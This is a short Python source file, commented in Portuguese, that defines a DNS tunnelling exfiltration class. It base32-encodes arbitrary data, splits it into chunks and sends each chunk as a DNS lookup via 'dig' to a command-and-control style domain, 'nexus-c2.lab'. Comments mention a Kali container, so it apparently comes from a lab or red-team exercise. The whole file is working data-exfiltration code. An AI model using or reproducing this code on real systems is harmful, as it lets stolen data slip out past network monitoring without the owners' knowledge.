import base64
import os
import subprocess

class DNSExfiltrator:
    def __init__(self, domain="nexus-c2.lab"):
        self.domain = domain

    def exfiltrate_data(self, data_string):
        """Transforma strings em consultas DNS fragmentadas."""
        # 1. Codificação segura
        encoded_data = base64.b32encode(data_string.encode()).decode().replace("=", "")
        
        # 2. Fragmentação (Chunks de 60 caracteres para OpSec)
        chunks = [encoded_data[i:i+60] for i in range(0, len(encoded_data), 60)]
        
        print(f"[*] Iniciando exfiltração de {len(chunks)} pacotes DNS...")
        
        for idx, chunk in enumerate(chunks):
            # Formato: id-pacote.chunk-de-dado.dominio.com
            query = f"p{idx}.{chunk}.{self.domain}"
            
            # Executa a consulta DNS via 'dig' ou 'nslookup' no container Kali
            subprocess.run(["dig", "+short", query], capture_output=True)
            
        return "[+] Exfiltração via Túnel DNS concluída."